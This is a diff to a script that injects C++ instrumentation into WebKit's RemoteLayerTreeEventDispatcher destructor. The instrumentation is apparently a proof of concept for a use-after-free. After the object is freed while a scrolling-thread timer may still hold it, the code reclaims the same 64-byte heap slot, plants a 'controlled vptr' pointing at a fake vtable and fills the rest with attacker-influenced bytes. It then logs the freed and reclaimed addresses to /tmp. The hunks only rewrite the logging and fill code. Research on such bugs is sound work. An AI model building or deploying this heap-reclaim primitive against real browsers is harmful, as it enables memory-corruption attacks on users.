@@ -51,12 +51,16 @@ MM_OLD = """RemoteLayerTreeEventDispatcher::~RemoteLayerTreeEventDispatcher()
     ASSERT(!m_displayRefreshObserverID);
 }"""
 MM_NEW = """// ---- WK_INTERPOSE_EXPERIMENT (research instrumentation) ------------------
+#include <fcntl.h>
+#include <unistd.h>
 static void wkInterposeLog(const char* tag, const void* a, const void* b)
 {
-    FILE* f = fopen("/tmp/wk-interpose-log.txt", "a");
-    if (f) {
-        fprintf(f, "WK-INTERPOSE %s a=%p b=%p\\n", tag, a, b);
-        fclose(f);
+    int fd = open("/tmp/wk-interpose-log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
+    if (fd >= 0) {
+        char buf[256];
+        int n = snprintf(buf, sizeof(buf), "WK-INTERPOSE %s a=%p b=%p\\n", tag, a, b);
+        if (n > 0) write(fd, buf, static_cast<size_t>(n));
+        close(fd);
     }
 }
 static void wkInterposeHit() { wkInterposeLog("HIT", nullptr, nullptr); }
@@ -80,11 +84,13 @@ RemoteLayerTreeEventDispatcher::~RemoteLayerTreeEventDispatcher()
         delete raw; // pre-fix: destroyed on the MAIN thread while the
                     // scrolling thread's CFRunLoopTimer callback may be
                     // in flight holding this raw pointer as context.
-        void* fake = malloc(64); // same fastMalloc 64-byte class
-        if (fake) {
-            *(void**)fake = (void*)&wkInterposeFakeVtable; // controlled vptr
-            memset((char*)fake + 8, 0x41, 56);             // attacker-influenced bytes
-            wkInterposeLog("SLOT-RECLAIMED", raw, fake);   // freed vs reclaimed addr
+        auto* bytes = static_cast<unsigned char*>(malloc(64)); // same 64-byte class
+        if (bytes) {
+            auto** vptrSlot = reinterpret_cast<void**>(bytes);
+            vptrSlot[0] = (void*)&wkInterposeFakeVtable;    // controlled vptr
+            for (size_t i = 8; i < 64; ++i)                 // attacker-influenced bytes
+                bytes[i] = 0x41;
+            wkInterposeLog("SLOT-RECLAIMED", raw, bytes);   // freed vs reclaimed addr
         }
     }
 }"""
